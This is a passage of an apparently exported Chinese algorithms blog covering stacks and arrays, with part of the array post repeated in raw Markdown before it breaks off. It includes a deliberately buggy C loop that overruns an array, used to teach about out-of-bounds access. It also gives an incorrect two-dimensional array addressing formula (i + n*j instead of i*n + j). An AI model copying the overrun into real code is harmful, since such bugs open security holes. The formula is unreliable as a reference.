title=\"支持动态扩容的顺序栈\"></a>支持动态扩容的顺序栈</h4><p>刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？</p>\n<p>还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。</p>\n<p>所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。</p>\n<p>实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。</p>\n<p>对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。</p>\n<p>也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。</p>\n<p>为了分析方便，我们先做一些假设和定义：</p>\n<ul>\n<li>栈空间不够时，我们重新申请一个是原来大小两倍的数组；</li>\n<li>为了简化分析，假设只有入栈操作没有出栈操作；</li>\n<li>定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。</li>\n</ul>\n<p>如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：</p>\n\n<p>从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。</p>\n<p>通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"栈的应用场景\"><a href=\"#栈的应用场景\" class=\"headerlink\" title=\"栈的应用场景\"></a>栈的应用场景</h3></div><br></div>\n\n<h4 id=\"栈在函数调用中的应用\"><a href=\"#栈在函数调用中的应用\" class=\"headerlink\" title=\"栈在函数调用中的应用\"></a>栈在函数调用中的应用</h4><p>前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。</p>\n<p>我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ret = add(<span class=\"number\">3</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">  res = a + ret;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, res);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  sum = x + y;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：</p>\n<img src=\"/posts/2018-09-15-算法-栈/函数栈.jpg\">\n<h4 id=\"栈在表达式求值中的应用\"><a href=\"#栈在表达式求值中的应用\" class=\"headerlink\" title=\"栈在表达式求值中的应用\"></a>栈在表达式求值中的应用</h4><p>我们再来看一个栈的常见应用场景，编译器如何利用栈实现<strong>表达式求值</strong>。</p>\n<p>这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？</p>\n<p>实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。</p>\n<p>这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。</p>\n<img src=\"/posts/2018-09-15-算法-栈/表达式栈图.jpg\">\n<h4 id=\"栈在括号匹配中的应用\"><a href=\"#栈在括号匹配中的应用\" class=\"headerlink\" title=\"栈在括号匹配中的应用\"></a>栈在括号匹配中的应用</h4><p>出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。</p>\n<p>我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？</p>\n<p>这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。</p>\n<p>当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。</p>\n<p>我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。</p>\n<p>当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈1.jpg\">\n<p>当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈2.jpg\">\n<p>这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：</p>\n<img src=\"/posts/2018-09-15-算法-栈/浏览器栈3.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3></div><br></div>\n\n<p>栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h3></div><br></div>\n\n<p>1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？<br>2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？</p>\n<p><br></p>\n"},{"title":"算法-数组","date":"2018-09-09T16:18:36.000Z","mathjax":true,"_content":"\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。\n\n是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。\n\n在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 数组如何实现随机访问？\n{% endnote %}\n</div>\n\n什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。\n\n这里有几个关键词：\n\n第一是**线性表**。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。\n\n与线性表相对应的概念是**非线性表**，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。\n\n第二个是**连续的内存空间和相同类型的数据**。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。\n\n说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？\n\n我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。\n\n{% asset_img 数组.jpg 数组 %}\n我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。\n\n<div style=\"text-align: center;\">\n{% cq %} \n$$ a[i]\\\\\\_address = base\\\\\\_address + i \\* data\\\\\\_type\\\\\\_size $$\n{% endcq %}\n</div>\n\n其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。\n\n很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。\n实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 低效的“插入”和“删除”\n{% endnote %}\n</div>\n前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？\n\n#### 插入操作\n\n假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。\n\n如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+...+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。\n\n如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。\n\n#### 删除操作\n\n跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。\n\n和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。\n\n实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？\n\n我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。\n\n{% asset_img 数组删除.jpg %}\n\n为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。\n\n如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=red>**很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的**</font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 警惕数组越界问题\n{% endnote %}\n</div>\n了解数组的几个基本操作后，再来看看数据的访问越界问题。\n\n这里以一段C语言代码为例来进行说明：\n\n```C\nint main(int argc, char* argv[]){\n\tint i = 0;\n\tint arr[3] = {0};\n\tfor(i; i<=3; i++){\n\t\tarr[i] = 0;\n\t\tprintf(\"hello world\\n\");\n\t}\n\treturn 0;\n}\n```\n\n你发现问题了吗？这段代码并不是打印三行\"hello world\"，而是会无限打印\"hello world\"，这是为什么呢？\n\n我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i<=3而非i<3，所以当i=3时，数组访问越界。\n\n我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。\n\n关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: [https://blog.csdn.net/liuhuiyi/article/details/7526889](https://blog.csdn.net/liuhuiyi/article/details/7526889)\n\n数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。\n\n所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。\n\n但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 容器能否完全代替数组?\n{% endnote %}\n</div>\n针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？\n\n以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。\n\n不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。\n\n作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。\n\n1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。\n\n2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。\n\n对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。\n\n\n#### 解答开篇\n\n为什么数组的索引是从0开始，而不是从1开始呢？\n\n从数组存储的内存模型来看，\"下标\"即索引最确切的定义应该是\"偏移(offset)\"，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可\n$$ a[k]\\\\\\_address = base\\\\\\_address + k \\* type\\\\\\_size $$\n\n但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：\n$$ a[k]\\\\\\_address = base\\\\\\_address + (k-1) \\* type\\\\\\_size $$\n\n对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。\n\n不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。\n\nC语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。\n\n\n#### 思考题\n\n1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。\n2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？\n\n\n---\n##### JVM标记清除垃圾回收算法：\n\n分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。\n\n该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。\n\n##### 二维数组的寻址公式：\n\n{% asset_img 二维数组.jpg %}\n\n根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：\n$$ arr[i][j]\\\\\\_address = base\\\\\\_address + (i + n\\*j)\\*data\\\\\\_type\\\\\\_size $$\n\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-数组.md","raw":"---\ntitle: 算法-数组\ndate: 2018-09-10 00:18:36\ntags: ['算法','数组']\ncategories: 算法\nmathjax: true\n---\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。\n\n是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。\n\n在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 数组如何实现随机访问？\n{% endnote %}\n</div>\n\n什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。\n\n这里有几个关键词：\n\n第一是**线性表**。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。\n\n与线性表相对应的概念是**非线性表**，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。\n\n第二个是**连续的内存空间和相同类型的数据**。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。\n\n说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？\n\n我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。\n\n{% asset_img 数组.jpg 数组 %}\n我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。\n\n<div style=\"text-align: center;\">\n{% cq %} \n$$ a[i]\\\\\\_address = base\\\\\\_address + i \\* data\\\\\\_type\\\\\\_size $$\n{% endcq %}\n</div>\n\n其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。\n\n很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。\n实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 低效的“插入”和“删除”\n{% endnote %}\n</div>\n前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？\n\n#### 插入操作\n\n假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。\n\n如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+...+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。\n\n如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。\n\n#### 删除操作\n\n跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。\n\n和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。\n\n实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？\n\n我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。\n\n{% asset_img 数组删除.jpg %}\n\n为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。\n\n如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=red>**很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的**</font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 警惕数组越界问题\n{% endnote %}\n</div>\n了解数组的几个基本操作后，再来看看数据的访问越界问题。\n\n这里以一段C语言代码为例来进行说明：\n\n```C\nint main(int argc, char* argv[]){\n\tint i = 0;\n\tint arr[3] = {0};\n\tfor(i; i<=3; i++){\n\t\tarr[i] = 0;\n\t\tprintf(\"hello world\\n\");\n\t}\n\treturn 0;\n}\n```\n\n你发现问题了吗？这段代码并不是打印三行\"hello world\"，而是会无限打印\"hello world\"，这是为什么呢？\n\n我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i<=3而非i<3，所以当i=3时，数组访问越界。\n\n我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。\n\n关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: [https://blog.csdn.net/liuhuiyi/article/details/7526889](https://blog.csdn.net/liuhuiyi/article/details/7526889)\n\n数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。\n\n所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。\n\n但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 容器能否完全代替数组?\n{% endnote %}\n</div>\n针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？\n\n以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。\n\n不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。\n\n作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。\n\n1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。\n\n2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。\n\n对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。\n\n\n#### 解答开篇\n\n为什么数组的索引是从0开始，而不是从1开始呢？\n\n从数组存储的内存模型来看，\"下标\"即索引最确切的定义应该是\"偏移(offset)\"，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可\n$$ a[k]\\\\\\_address = base\\\\\\_address + k \\* type\\\\\\_size $$\n\n但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：\n$$ a[k]\\\\\\_address = base\\\\\\_address + (k-1) \\* type\\\\\\_size 